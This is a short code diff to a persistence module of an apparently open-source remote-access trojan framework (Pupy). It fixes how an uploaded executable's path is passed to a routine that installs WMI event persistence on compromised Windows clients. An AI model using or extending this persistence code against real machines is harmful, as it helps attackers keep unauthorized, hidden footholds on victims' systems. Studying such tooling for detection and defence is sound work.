@@ -108,6 +108,7 @@ class PersistenceModule(PupyModule):
 
         exebuff=b""
         cmd=None
+        remote_path=None
         if args.exe:
             with open(args.exe,'rb') as f:
                 exebuff=f.read()
@@ -126,7 +127,6 @@ class PersistenceModule(PupyModule):
                 pos+=chunk_size
             rf.close()
             self.success("upload successful")
-            cmd = remote_path
         elif args.cmd:
             cmd = args.cmd
         else:
@@ -146,7 +146,7 @@ class PersistenceModule(PupyModule):
             if (self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System") or self.client.conn.modules['sys'].getwindowsversion()[0] < 6:
                 self.warning("You seems to lack some privileges to remove wmi persistence ...")
             self.info("creating wmi event ...")
-            if self.client.conn.modules['pupwinutils.persistence'].wmi_persistence(command=cmd, file=args.exe):
+            if self.client.conn.modules['pupwinutils.persistence'].wmi_persistence(command=cmd, file=remote_path):
                 self.success("persistence added using wmi!")
             else:
                 self.error("an error occured creating the wmi persistence, try to do it manually")
